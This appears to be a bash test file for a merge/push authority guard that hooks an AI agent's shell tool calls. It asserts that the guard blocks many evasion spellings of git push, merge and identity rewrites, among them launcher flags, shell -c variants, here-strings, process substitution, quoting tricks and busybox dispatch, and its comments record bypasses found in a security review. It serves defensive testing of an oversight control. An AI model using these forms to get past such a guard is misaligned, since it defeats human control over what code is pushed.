#!/usr/bin/env bash
# tests/test-merge-guard.sh — bin/firm-merge-guard: the merge/push authority gate.
#
# WHAT THIS FILE IS FOR. The guard's entire value is that it fails CLOSED, so the tests that matter
# most are the ones that drive it into a state where it CANNOT decide and assert that it refuses
# anyway. A control tested only in the allow direction is not tested (AC-013), and a fail-closed
# check whose fail-closed paths are untested is just an untested check.
#
# HOW THE FIXTURES WORK, AND WHY THERE IS NO TEST-ONLY CODE IN THE GUARD.
#   · The allowlist is redirected by COPYING the script and its policy file into a scratch tree
#     (mk_guard_tree). The guard resolves its policy from its own location, so the copy reads the
#     copied policy — which lets a test add, break, empty or delete an allowlist entry while
#     exercising the real resolution path. No `FIRM_*` override exists in the production script for
#     a test to lean on, so nothing here can pass because of a branch that only tests take.
#   · Identity is redirected with real PATH STUBS (mk_stub_gh) and a real scratch git repo. The
#     guard runs the same `gh api user --jq .login` and `git config user.email` it always runs.
#   · The allow direction uses the login/email READ OUT of the shipped policy file, so it cannot
#     silently drift from the real allowlist (and it is a second proof the file is what's consulted).
#
# NOT COVERED HERE, DELIBERATELY: the `gh` HANGS path (a 12-second bounded wait). It is real and it
# was verified by hand — see 09-test-evidence/ in the run ledger — but 12 idle seconds in a suite
# that runs on every push is a bad trade. Every other indeterminate path is asserted below.
set -uo pipefail
. "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

GUARD="$BIN/firm-merge-guard"
POLICY="$FIRM_ROOT/agent-firm/policy/merge-authority.yaml"
SETTINGS="$FIRM_ROOT/.claude/settings.json"
PLUGIN_HOOKS="$FIRM_ROOT/hooks/hooks.json"

# A PATH with a real python3 (WITH its site-packages, so pyyaml imports) and a real git, but NO gh.
# Note: symlinking python3 into a scratch dir would break its site-packages and silently turn a
# "gh is absent" test into a "pyyaml is absent" test — which is exactly the kind of test that passes
# for the wrong reason. Use the real directories instead.
NOGH_PATH="/usr/bin:/bin"

# ---- fixtures ------------------------------------------------------------------------------
# mk_guard_tree — scratch copy of the guard + its policy. Echoes the tree root.
mk_guard_tree() {
  _d="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-tree.XXXXXX")"
  t_track "$_d"
  mkdir -p "$_d/bin" "$_d/agent-firm/policy"
  cp "$GUARD" "$_d/bin/firm-merge-guard"
  cp "$POLICY" "$_d/agent-firm/policy/merge-authority.yaml"
  printf '%s' "$_d"
}

# mk_stub_gh <mode> [login] — a PATH dir holding a `gh` stub. Echoes the dir.
mk_stub_gh() {
  _s="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-stub.XXXXXX")"
  t_track "$_s"
  case "$1" in
    login)     printf '#!/bin/sh\nprintf "%%s\\n" "%s"\n' "$2" > "$_s/gh" ;;
    record)    printf '#!/bin/sh\nprintf "%%s\\n" "$*" >> "%s/gh.argv"\nprintf "%%s\\n" "%s"\n' "$_s" "$2" > "$_s/gh" ;;
    unauth)    printf '#!/bin/sh\necho "gh: To get started with GitHub CLI, please run:  gh auth login" >&2\nexit 4\n' > "$_s/gh" ;;
    empty)     printf '#!/bin/sh\nexit 0\n' > "$_s/gh" ;;
    malformed) printf '#!/bin/sh\nprintf "{\\"message\\":\\"Bad credentials\\"}\\n"\n' > "$_s/gh" ;;
    offline)   printf '#!/bin/sh\necho "dial tcp: lookup api.github.com: no such host" >&2\nexit 1\n' > "$_s/gh" ;;
    explode)   printf '#!/bin/sh\necho "STUB-GH-WAS-EXECUTED" >&2\nexit 99\n' > "$_s/gh" ;;
  esac
  chmod +x "$_s/gh"
  printf '%s' "$_s"
}

# mk_id_repo <email> — scratch git repo on main whose repo-local user.email is <email>.
mk_id_repo() {
  _r="$(mk_repo)" || return 1
  git -C "$_r" config user.email "$1" >/dev/null 2>&1
  printf '%s' "$_r"
}

# The two allow-listed values, read from the shipped policy file (never hard-coded here).
ALLOWED_LOGIN="$(python3 -c "
import yaml; d=yaml.safe_load(open('$POLICY')); print(d['allowed'][0]['gh_login'])")"
ALLOWED_EMAIL="$(python3 -c "
import yaml; d=yaml.safe_load(open('$POLICY')); print(d['allowed'][0]['git_emails'][0])")"

# ---- runners -------------------------------------------------------------------------------
# mg_env <tree> <PATH> <cwd> <args...>   — run the scratch guard with an exact PATH.
mg_env() {
  local t="$1" pth="$2" cwd="$3"; shift 3
  ( cd "$cwd" && PATH="$pth" "$t/bin/firm-merge-guard" "$@" )
}
# mg <tree> <stubdir> <cwd> <args...>    — stub dir prepended to the real PATH.
mg() {
  local t="$1" s="$2" cwd="$3"; shift 3
  mg_env "$t" "$s:$PATH" "$cwd" "$@"
}
mk_payload() {
  python3 -c 'import json,sys; print(json.dumps({"session_id":"t","cwd":".",
    "hook_event_name":"PreToolUse","tool_name":"Bash",
    "tool_input":{"command":sys.argv[1],"description":"d"}}))' "$1"
}
# mg_hook <tree> <stubdir> <cwd> <command> — drive the PreToolUse adapter with a real payload.
mg_hook() {
  local t="$1" s="$2" cwd="$3" c="$4" p
  p="$(mk_payload "$c")"
  ( cd "$cwd" && printf '%s' "$p" | PATH="$s:$PATH" "$t/bin/firm-merge-guard" --hook )
}

# assert_not_output <desc> <needle> <cmd...>  — stdout+stderr must NOT contain <needle>.
# Deliberately local to this file rather than lib.sh: asserting an ABSENCE is only ever right when
# the absence IS the contract, and here it is exactly one thing — the block message must not hand
# the blocked agent a command that re-authorises it (SEC-04).
assert_not_output() {
  local desc="$1" needle="$2" out; shift 2
  out="$("$@" 2>&1)"
  case "$out" in
    *"$needle"*) _t_no "$desc" "found forbidden '$needle' in: $(_t_ctx "$out")" ;;
    *) _t_ok "$desc" ;;
  esac
}

# mg_both <desc> <command> — a gated command must be REFUSED by --command (1, the surface matched
# under a non-allow-listed identity) AND must BLOCK through the hook adapter (2, the tool call is
# actually stopped). Both axes matter: --command proves the classifier saw it, --hook proves the
# enforcement surface does. rc=0 in either is the bypass. Callers must set TREE/GH_OK/REPO_BAD.
mg_both() {
  assert_rc "$1"                     1 mg      "$TREE" "$GH_OK" "$REPO_BAD" --command "$2"
  assert_rc "$1 · through the hook"  2 mg_hook "$TREE" "$GH_OK" "$REPO_BAD" "$2"
}
# mg_gap <desc> <command> — a DECLARED gap: permitted in both modes. Not a win; recorded so the
# gap list printed by --surface cannot drift away from the behaviour.
mg_gap() {
  assert_rc "GAP: $1"                    0 mg      "$TREE" "$GH_OK" "$REPO_BAD" --command "$2"
  assert_rc "GAP: $1 · through the hook" 0 mg_hook "$TREE" "$GH_OK" "$REPO_BAD" "$2"
}

# A tracked DIRECTORY, not a bare mktemp file: tests/lib.sh's teardown only removes directories, so
# a registered plain file would be skipped and leaked.
_hdr_dir="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-header.XXXXXX")"; t_track "$_hdr_dir"
SCRATCH_HEADER="$_hdr_dir/header.txt"

TREE="$(mk_guard_tree)"
GH_OK="$(mk_stub_gh login "$ALLOWED_LOGIN")"
GH_BAD="$(mk_stub_gh login some-other-account)"
REPO_OK="$(mk_id_repo "$ALLOWED_EMAIL")"
REPO_BAD="$(mk_id_repo nobody@example.com)"

# ============================================================ AC-013 · both directions
t_case "AC-013 the control BLOCKS a non-allow-listed identity and PERMITS an allow-listed one"
assert_rc "gh allow-listed + git email NOT allow-listed -> refused"      1 \
  mg "$TREE" "$GH_OK"  "$REPO_BAD" --command 'git merge feature/x'
assert_rc "gh NOT allow-listed + git email allow-listed -> refused"      1 \
  mg "$TREE" "$GH_BAD" "$REPO_OK"  --command 'git merge feature/x'
assert_rc "neither allow-listed -> refused"                              1 \
  mg "$TREE" "$GH_BAD" "$REPO_BAD" --command 'git merge feature/x'
assert_rc "BOTH allow-listed -> permitted"                               0 \
  mg "$TREE" "$GH_OK"  "$REPO_OK"  --command 'git merge feature/x'
assert_output "the permit says so, naming both resolved identities" "permitted" \
  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
assert_output "the permit names the gh login it resolved" "$ALLOWED_LOGIN" \
  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'

t_case "AC-013 a merge INTO the default branch while it is checked out is the gated case"
DEF_REPO="$(mk_id_repo nobody@example.com)"
( cd "$DEF_REPO" && git checkout -q main && git checkout -q -b feature/x && printf 'x\n' > f.txt \
    && git add -A && git commit -qm f && git checkout -q main ) >/dev/null 2>&1
assert_eq "fixture really is on main" "main" "$(git -C "$DEF_REPO" rev-parse --abbrev-ref HEAD)"
assert_rc "on main, `git merge feature/x` is refused for a non-allowed identity" 1 \
  mg "$TREE" "$GH_OK" "$DEF_REPO" --command 'git merge feature/x'
assert_rc "on main, the same merge is permitted for an allowed identity" 0 \
  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'

# ============================================================ AC-014 · the command surface
# Every entry gets its OWN assertion. A non-allow-listed identity is stubbed, so rc=1 proves the
# command MATCHED the gated surface and rc=0 would prove it did not.
t_case "AC-014 git push — every form"
assert_rc "git push"                              1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push'
assert_rc "git push --force origin main"          1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push --force origin main'
assert_rc "git push -f"                           1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push -f'
assert_rc "git push --force-with-lease"           1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push --force-with-lease origin main'
assert_rc "git push --tags"                       1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push --tags'
assert_rc "git push --mirror"                     1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push --mirror'
assert_rc "git push --delete origin main"         1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push --delete origin main'
assert_rc "explicit refspec at the default branch" 1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin HEAD:main'
assert_rc "forced refspec at the default branch"   1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin +refs/heads/wip:refs/heads/main'
assert_rc "a non-'origin' remote name"             1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push upstream main'
assert_rc "a URL instead of a remote name"         1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push https://github.com/o/r.git main'
assert_rc "git -C <path> push"                     1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git -C /tmp/other push'
assert_rc "git -c k=v push (the -c value is not the subcommand)" 1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git -c user.email=x@y.z push origin main'
assert_rc "git --no-pager push"                    1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git --no-pager push'
assert_rc "git --git-dir=... push"                 1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git --git-dir=/tmp/r/.git push'
assert_rc "git subtree push"                       1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git subtree push --prefix=d origin main'

t_case "AC-014 local merges"
assert_rc "git merge"                              1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge feature'
assert_rc "git merge --no-ff"                      1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge --no-ff origin/feature'
assert_rc "git merge --squash"                     1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge --squash x'
assert_rc "git pull (it merges)"                   1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git pull'
assert_rc "git pull origin main"                   1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git pull origin main'

t_case "AC-014 compound and wrapped commands"
assert_rc "git switch main && git merge ..."       1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git switch main && git merge feature/x'
assert_rc "git checkout main ; git merge ..."      1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git checkout main; git merge feature/x'
assert_rc "benign && git push (second segment)"    1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git status && git push origin main'
assert_rc "git push || echo failed"                1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push || echo failed'
assert_rc "(subshell git push)"                    1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command '(cd /tmp && git push)'
assert_rc "a NEWLINE-separated script"             1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git add -A
git commit -m wip
git push origin main'
assert_rc "a backslash-continued command"          1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push \
  origin main'
assert_rc "sudo git push"                          1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'sudo git push'
assert_rc "env VAR=v git push"                     1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'env GIT_SSH_COMMAND=ssh git push'
assert_rc "leading VAR=v assignment"               1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'GIT_TRACE=1 git push origin main'
assert_rc "time git push"                          1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'time git push'
assert_rc "an absolute path to git"                1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command '/usr/bin/git push'
assert_rc "bash -c '<push>'"                       1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command "bash -c 'git push origin main'"
assert_rc "sh -c \"<merge>\""                      1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'sh -c "git merge main"'
assert_rc "captured in a \$( ) substitution"       1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'out="$(git push origin main 2>&1)"'
assert_rc "captured in backticks"                  1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'out=`git push origin main`'
assert_rc "a heredoc body fed to bash IS scanned"  1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command "bash <<'EOF'
cd /tmp/r
git push origin main
EOF"

# ======================================================== AC-014/SEC-01 · the LAUNCHER class
# WHAT THIS SECTION PINS. An independent security review found 17 command strings that reach a real
# merge/push and that this guard PERMITTED with exit 0 — in hook mode, the actual enforcement
# surface. Every one of them is asserted below, in BOTH modes, because the previous round's tests
# asserted only the three BARE wrapper forms (`sudo git push`, `env VAR=v git push`,
# `time git push`) and therefore said nothing about the failure that mattered.
#
# NONE of these is an evasion. `bash -ec '<cmd>'`, `timeout 60 <cmd>`, `nice -n 10 <cmd>` and
# `xargs <cmd>` are how an agent ordinarily writes a command. The defect was structural: the
# wrapper-skip loop BROKE on the first flag, so argv[0] became `-u` / `-n` / `--`; the shell `-c`
# check matched only a fixed 4-item list; `{...}` and leading redirections were not handled.
t_case "AC-014/SEC-01 a launcher's OWN FLAGS and flag VALUES do not hide the command it launches"
mg_both "sudo -u <user> git push"          'sudo -u josh git push origin main'
mg_both "sudo -- git push"                 'sudo -- git push origin main'
mg_both "nice -n 10 git push"              'nice -n 10 git push origin main'
mg_both "nice -n19 git push (attached)"    'nice -n19 git push origin main'
mg_both "env -u FOO git push"              'env -u FOO git push origin main'
mg_both "env -i git push (flag, then git)" 'env -i git push origin main'
mg_both "stdbuf -o0 git push"              'stdbuf -o0 git push origin main'
mg_both "command -p git push"              'command -p git push origin main'
mg_both "ionice -c3 git push"              'ionice -c3 git push origin main'
mg_both "timeout 60 git push (bare secs)"  'timeout 60 git push origin main'
mg_both "timeout -s KILL 60 git merge"     'timeout -s KILL 60 git merge feature/x'
mg_both "xargs git push"                   'echo main | xargs git push origin'
mg_both "xargs -n1 git push"               'xargs -n1 git push origin main'
mg_both "a launcher in front of gh"        'timeout 30 gh pr merge 12'
mg_both "two launchers stacked"            'sudo -u josh nice -n 10 git push origin main'

# ============================================ AC-014/SEC-02/SEC-13 · the flag-VALUE dilemma
# THE TWO HALVES BELOW MUST STAY IN ONE t_case, because they are the two horns of one dilemma and
# the only wrong fix is to satisfy one at the other's expense.
#
# A launcher's flag VALUE can be spelled exactly like a command word. `git` is the conventional
# service-account name (gitolite, gitea, forgejo, git-daemon), so `sudo -u git git push origin main`
# is an ordinary phrasing, not an evasion — and it PERMITTED, because the command-word test ran
# before the flag-value test: argv became ["git","git","push"], classify_git read sub="git", and
# nothing matched. It also CHAINED: `sudo -u git git config --global user.email <v>` re-opened the
# SEC-04 self-authorship route through the same hole. And SURFACE_COVERED claims "a launcher word
# AND ITS OWN FLAGS AND FLAG VALUES ... `sudo -u josh` ... all resolve to the command they launch",
# so `sudo -u josh git push` blocking while `sudo -u git git push` permitted was a FALSE COVERED
# CLAIM — the exact defect the SEC-02 blocker was raised for.
#
# THE FIX IS NOT A REORDER, AND THIS BLOCK IS WHAT PROVES IT. The four value-LESS-flag forms in the
# second half block *because* the command-word test wins (`-i`, `-p`, `-n`, `-19` take no value, so
# the next token IS the command). Moving the flag-value branch above the command-word branch closes
# the first half and RE-OPENS the second. There is no per-launcher table of which flags take a
# value, so no ordering gets both right: launcher_argvs emits BOTH readings and classify_segment
# gates if EITHER hits. A regression to either horn fails here.
t_case "AC-014/SEC-13 a flag VALUE spelled like a command word is classified BOTH ways"
mg_both "sudo -u git git push (the -u VALUE is 'git')" 'sudo -u git git push origin main'
mg_both "sudo -u git git merge"            'sudo -u git git merge feature'
mg_both "sudo -u \"git\" (quoted value)"   'sudo -u "git" git push origin main'
mg_both "sudo -E -u git (a flag before it)" 'sudo -E -u git git push origin main'
mg_both "sudo -g git (a different flag)"   'sudo -g git git push origin main'
mg_both "doas -u git"                      'doas -u git git push origin main'
mg_both "sudo -u sh (a SHELL name as the value)"  'sudo -u sh git push origin main'
mg_both "sudo -u bash"                     'sudo -u bash git push origin main'
mg_both "sudo -u zsh git merge"            'sudo -u zsh git merge feature'
mg_both "sudo -u gh (gh as the value)"     'sudo -u gh git push origin main'
mg_both "chained launchers, ambiguous in the middle" \
                                           'nohup nice -n git timeout 60 git push origin main'
# The chain back into SEC-04: the same hole re-authorised the guard's own identity axis.
mg_both "sudo -u git git config --global user.email (re-opened SEC-04)" \
                                           'sudo -u git git config --global user.email a@b.c'
# EVERY launcher in the set that has a value-taking flag. The reviewer measured 12/12 permitting;
# each gets its own assertion so no single one can regress quietly.
mg_both "nice -n git"                      'nice -n git git push origin main'
mg_both "env -u git"                       'env -u git git push origin main'
mg_both "timeout -s git"                   'timeout -s git git push origin main'
mg_both "xargs -a git"                     'xargs -a git git push origin main'
mg_both "watch -n git"                     'watch -n git git push origin main'
mg_both "stdbuf -o git"                    'stdbuf -o git git push origin main'
mg_both "flock -E git"                     'flock -E git git push origin main'
mg_both "taskset -c git"                   'taskset -c git git push origin main'
mg_both "script -c git"                    'script -c git git push origin main'
mg_both "ionice -c git"                    'ionice -c git git push origin main'
mg_both "setpriv --reuid=git"              'setpriv --reuid=git git push origin main'
mg_both "runuser -u git --"                'runuser -u git -- git push origin main'
# ---- THE OTHER HORN. These block BECAUSE the token after a value-LESS flag IS the command word.
# A naive reorder of the two branches re-opens every one of them. Verified: before the fix all four
# blocked and all twelve above permitted; after it, all sixteen block.
mg_both "env -i git push (the flag takes NO value)"  'env -i git push origin main'
mg_both "command -p git push"              'command -p git push origin main'
mg_both "sudo -n git push"                 'sudo -n git push origin main'
mg_both "nice -19 git push (attached, no value)" 'nice -19 git push origin main'
mg_both "sudo -E git push"                 'sudo -E git push origin main'
mg_both "env -0 git push"                  'env -0 git push origin main'
# ---- AND THE COST IS BOUNDED: the extra reading must not invent a match. `sudo -u git git status`
# is the SAME ambiguous shape with a non-gated subcommand, and it must still cost nothing.
t_case "AC-024/SEC-13 the second reading does not over-block (the shape alone is not a match)"
for c in 'sudo -u git whoami' 'sudo -u git git status' 'sudo -u git git log --oneline' \
         'env -u git ls' 'nice -n git ls' 'sudo -u sh sh -c "git status"' \
         'sudo -u bash bash -c "echo git push is denied"'; do
  assert_rc "not gated: $c" 0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$c"
done
# The ambiguity CAP fails closed. A prefix ambiguous in more than MAX_LAUNCHER_READINGS places is
# cannot-evaluate (2), never a permit — a cap that DROPPED a reading would be a fail-open, which is
# the whole point of emitting both readings in the first place.
MANY_AMBIG="sudo"
for _i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do MANY_AMBIG="$MANY_AMBIG -u git"; done
assert_rc "a prefix ambiguous past the cap BLOCKS (cannot evaluate), never permits" 2 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$MANY_AMBIG git push origin main"
assert_output "  and says why it could not resolve the command word" "ambiguous in more than" \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$MANY_AMBIG git push origin main"
assert_rc "  and the same shape through the hook still blocks" 2 \
  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" "$MANY_AMBIG git push origin main"
assert_ok "the cap constant is real and is the one the message names" python3 -c "
import re
src = open('$GUARD').read()
m = re.search(r'^MAX_LAUNCHER_READINGS = (\d+)\$', src, re.M)
assert m, 'MAX_LAUNCHER_READINGS is not defined, so the cap test above proves nothing'
assert 'MAX_LAUNCHER_READINGS' in src.split('raise Cannot(\"the launcher prefix is ambiguous')[1][:200], \
    'the cap is hard-coded in the message rather than read from the constant'
print('ok', m.group(1))
"

t_case "AC-014/SEC-01 a shell's inline command flag is matched as a PATTERN, not a fixed list"
mg_both "bash -ec '<push>'"                "bash -ec 'git push origin main'"
mg_both "bash -xc '<push>'"                "bash -xc 'git push origin main'"
mg_both "sh -ec '<merge>'"                 "sh -ec 'git merge main'"
mg_both "bash -exc '<push>'"               "bash -exc 'git push origin main'"
mg_both "bash -lc '<push>'"                "bash -lc 'git push origin main'"
mg_both "bash -o pipefail -c '<push>'"     "bash -o pipefail -c 'git push origin main'"
mg_both "bash --rcfile <f> -c '<push>'"    "bash --rcfile /tmp/rc -c 'git push origin main'"
mg_both "zsh -c '<push>'"                  "zsh -c 'git push origin main'"
# The uppercase -C (noclobber) is NOT -c, so it must not swallow the next token as a command.
assert_rc "bash -C <script> is not an inline command (no false positive)" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'bash -C deploy-and-push.sh'

t_case "AC-014/SEC-01 here-strings, brace groups, keywords, negation and leading redirections"
mg_both "bash <<< '<push>' (here-STRING)"  "bash <<< 'git push origin main'"
mg_both "sh <<< '<merge>'"                 "sh <<< 'git merge main'"
mg_both "{ git push; } (brace group)"      '{ git push origin main; }'
mg_both "! git push (negation)"            '! git push origin main'
mg_both "if ...; then git push; fi"        'if git diff --quiet; then git push origin main; fi'
mg_both "for ...; do git push; done"       'for f in a b; do git push origin main; done'
mg_both "LEADING redirection"              '>/dev/null git push origin main'
mg_both "LEADING fd-prefixed redirection"  '2>/tmp/e git merge main'
mg_both "trailing redirection + 2>&1"      'git push origin main >log 2>&1'
mg_both "a command string as a flag VALUE" "flock -c 'git push origin main'"
mg_both "watch '<push>'"                   "watch 'git push origin main'"
assert_rc "a heredoc PIPED to bash is scanned (keep/drop is per-segment, not head[0])" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "cat <<'EOF' | bash
cd /tmp/r
git push origin main
EOF"
assert_rc "  the same, through the hook" 2 \
  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" "cat <<'EOF' | bash
cd /tmp/r
git push origin main
EOF"
assert_rc "bash -s <<'EOF' body is scanned" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "bash -s <<'EOF'
git push origin main
EOF"

# ==================================================== AC-014/SEC-14 · multi-call shell dispatchers
# `busybox`/`toybox` are ONE binary that dispatches on its first operand: `busybox sh -c '<cmd>'`
# runs the shell. A previous wave added `busybox` to SHELLS, which made this WORSE than leaving it
# out — classify_segment handed ["busybox","sh","-c","<cmd>"] to shell_inline, whose loop hit the
# non-flag operand `sh`, concluded it was a script FILE and returned None. A name in WRAPPERS would
# have been skipped past correctly. So the invariant is asserted, not just the behaviour: a
# dispatcher belongs on the WRAPPERS side, and the two sets must not overlap.
t_case "AC-014/SEC-14 a multi-call dispatcher resolves to the shell it dispatches to"
mg_both "busybox sh -c '<push>'"           "busybox sh -c 'git push origin main'"
mg_both "busybox ash -c '<push>'"          "busybox ash -c 'git push origin main'"
mg_both "busybox sh -ec '<merge>'"         "busybox sh -ec 'git merge main'"
mg_both "toybox sh -c '<push>'"            "toybox sh -c 'git push origin main'"
mg_both "busybox sh <<< '<push>'"          "busybox sh <<< 'git push origin main'"
mg_both "a launcher in front of the dispatcher" "sudo -u josh busybox sh -c 'git push origin main'"
assert_rc "busybox with a NON-shell applet is not gated (no false positive)" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'busybox ls -la'
assert_ok "the dispatchers are in WRAPPERS, NOT in SHELLS, and the two sets are DISJOINT" python3 -c "
import ast, re
src = open('$GUARD').read()
def tup(name):
    m = re.search(r'^%s\s*=\s*(\(.*?\))' % name, src, re.M | re.S)
    assert m, 'could not parse %s out of the guard' % name
    return set(ast.literal_eval(m.group(1)))
shells, multicall = tup('SHELLS'), tup('MULTICALL')
# WRAPPERS is spelled as a literal tuple + MULTICALL, so evaluate just the literal part.
m = re.search(r'^WRAPPERS = (\(.*?\))\s*\+\s*MULTICALL\s*\$', src, re.M | re.S)
assert m, 'WRAPPERS is no longer literal-tuple + MULTICALL; re-check this assertion'
wrappers = set(ast.literal_eval(m.group(1))) | multicall
assert multicall, 'MULTICALL is empty, so nothing is being asserted'
assert multicall <= wrappers, f'a dispatcher is not a launcher: {multicall - wrappers}'
assert not (multicall & shells), (
    f'{multicall & shells} is in SHELLS: shell_inline will read the APPLET NAME as a script file '
    'and return None, which is exactly the SEC-14 bypass')
assert not (shells & wrappers), f'SHELLS and WRAPPERS overlap: {shells & wrappers}'
print('ok', sorted(multicall))
"

# ============================== AC-014/SEC-15 · here-strings piped onward, and process substitution
# TWO ASYMMETRIES, both introduced by earlier fixes that stopped one token short.
#  1. The heredoc path decides keep/drop with line_feeds_shell(line) — "ANY segment of the
#     introducing line is a shell" — so `cat <<'EOF' | bash` is scanned. The HERE-STRING path did
#     not get the same treatment: `here` operands were only consulted inside the `prog in SHELLS`
#     branch of the segment that OWNED them, so `cat <<< '<cmd>' | bash` was never classified while
#     the deliberately symmetric heredoc was. Both spellings run the same command.
#  2. shlex lexes `<(` as one punctuation run containing `<`, so segments() read it as a
#     REDIRECTION and dropped the following token as the "filename". `cat <(git push origin main)`
#     therefore lost the `git` and left `push origin main` as the segment — a real push, with the
#     command text fully inline and visible, which is NOT the declared script-FILE gap.
t_case "AC-014/SEC-15 a here-string is a command string wherever the shell that eats it sits"
mg_both "cat <<< '<push>' | bash (a LATER segment is the shell)" \
                                           "cat <<< 'git push origin main' | bash"
mg_both "cat <<< '<config write>' | sh"    "cat <<< 'git config --global user.email a@b.c' | sh"
mg_both "cat <<< '<push>' | busybox sh"    "cat <<< 'git push origin main' | busybox sh"
mg_both "printf %s <<< '<merge>' | zsh"    "printf %s <<< 'git merge feature' | zsh"
# ...and the symmetric heredoc it was inconsistent with must still block, so this stays a PAIR.
assert_rc "the symmetric heredoc form still blocks (the asymmetry is gone, both ways)" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "cat <<'EOF' | bash
git push origin main
EOF"
# NO FALSE POSITIVE: a here-string on a line with NO shell on it is just data.
assert_rc "a here-string fed to a NON-shell is not classified" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "cat <<< 'git push origin main' | grep -c push"
assert_rc "  nor one fed to a non-shell with no pipe at all" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "grep -c origin <<< 'git push origin main'"

t_case "AC-014/SEC-15 a process substitution is a command boundary, not a redirection"
mg_both "cat <(git push origin main)"      'cat <(git push origin main)'
mg_both "diff <(git log) <(git push ...)"  'diff <(git log) <(git push origin main)'
mg_both "tee >(git push origin main)"      'tee >(git push origin main)'
mg_both "a config write inside <( )"       'cat <(git config --global user.email a@b.c)'
mg_both "wc -l <(gh pr merge 12)"          'wc -l <(gh pr merge 12)'
assert_rc "a benign process substitution is untouched" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'diff <(sort a.txt) <(sort b.txt)'
# The ordinary redirections the parens test now runs in front of must be unaffected.
assert_rc "  and a LEADING redirection still resolves (the paren test did not eat it)" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command '>/dev/null git push origin main'
assert_rc "  and an fd-prefixed one still resolves" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command '2>/tmp/e git merge main'
assert_rc "  and a subshell still resolves" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command '(cd /tmp && git push)'

# ================================================= AC-014/SEC-16 · the identity-switching launchers
# `su` sits directly beside `sudo` and `doas` in the launcher set's evident intent, and `su -c
# '<cmd>'` additionally defeated the -c handling because `su` was not recognised as a launcher at
# all. Every WRAPPERS name is already driven by the AC-019/SEC-02 loop below in its BARE form; these
# assertions cover the flag forms that loop does not reach.
t_case "AC-014/SEC-16 su and the other identity/namespace launchers resolve their command"
mg_both "su - git -c '<push>'"             "su - git -c 'git push origin main'"
mg_both "su -c '<push>' git"               "su -c 'git push origin main' git"
mg_both "su -c '<config write>'"           "su -c 'git config --global user.email a@b.c'"
mg_both "runuser -u git -- git push"       'runuser -u git -- git push origin main'
mg_both "setpriv --reuid=1000 git push"    'setpriv --reuid=1000 git push origin main'
mg_both "unshare -r git push"              'unshare -r git push origin main'
mg_both "systemd-run --unit=x git push"    'systemd-run --unit=x git push origin main'
mg_both "nsenter -a git push"              'nsenter -a git push origin main'

# ======================================================== AC-014/SEC-03 · the QUOTING class
# The shlex classifier resolves shell quoting correctly, but a raw-SUBSTRING prefilter ran first and
# threw these away before the classifier ever saw them. The prefilter now deletes backslashes and
# quotes (bash parameter expansion, zero subprocesses) before its substring test; `$'git'` was a
# separate defect in the classifier itself, which read `$git` as the program name.
t_case "AC-014/SEC-03 shell quoting of the command word or subcommand does not defeat the check"
mg_both "git pus\\h (escaped letter)"       'git pus\h origin main'
mg_both "git 'pu'sh (quoted fragment)"      "git 'pu'sh origin main"
